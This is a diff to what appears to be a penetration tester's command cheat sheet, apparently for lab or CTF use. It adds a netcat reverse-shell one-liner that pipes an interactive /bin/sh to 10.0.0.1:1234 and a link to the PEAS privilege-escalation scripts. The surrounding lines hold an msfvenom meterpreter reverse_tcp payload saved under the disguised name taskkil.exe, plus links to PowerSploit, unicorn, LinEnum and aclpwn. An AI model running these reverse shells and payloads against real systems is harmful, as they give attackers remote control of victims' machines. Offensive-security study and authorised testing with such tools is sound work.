@@ -145,7 +145,7 @@ export SHELL=bash
 export TERM=xterm256-color
 stty rows 24 columns 80
 
-
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 tcpdump -i tun0 icmp
 python -m SimpleHTTPServer 80
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=51251 -f exe -o taskkil.exe
@@ -164,6 +164,7 @@ unicorn --> https://github.com/trustedsec/unicorn.git
 powersploit --> https://github.com/PowerShellMafia/PowerSploit.git
 powershell-suite --> https://github.com/FuzzySecurity/PowerShell-Suite
 linenum --> https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+peas --> https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
 aclpwn --> https://github.com/fox-it/aclpwn.py
 
 APT
